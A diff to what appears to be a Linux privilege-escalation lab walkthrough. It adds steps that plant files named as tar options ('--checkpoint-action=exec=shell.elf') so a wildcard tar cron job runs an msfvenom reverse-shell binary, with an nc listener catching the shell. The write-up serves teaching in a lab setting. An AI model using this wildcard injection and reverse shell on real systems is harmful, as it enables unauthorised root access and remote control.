@@ -19,8 +19,16 @@ msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f elf -o s
 4. Using scp transfer the elf file to /home/user of Debian VM.
 scp shell.elf user@VM_IP:/home/user
 
-5. Now in attackbox start a reverse shell listener.
+5.In Debian VM's /home/user directory:
+(a) chmod +x /home/user/shell.elf
+(b) touch /home/user/--checkpoint=1
+(c) touch /home/user/--checkpoint-action=exec=shell.elf
+Explanation:
+When the tar command in the cron job runs, the wildcard (*) will expand to include these files. Since their filenames are 
+valid tar command line options, tar will recognize them as such and treat them as command line options rather than filenames.
+
+6. Now in attackbox start a reverse shell listener.
 nc -lnvp 4444
 
-6. Got the shell.
+7. Got the shell.
 
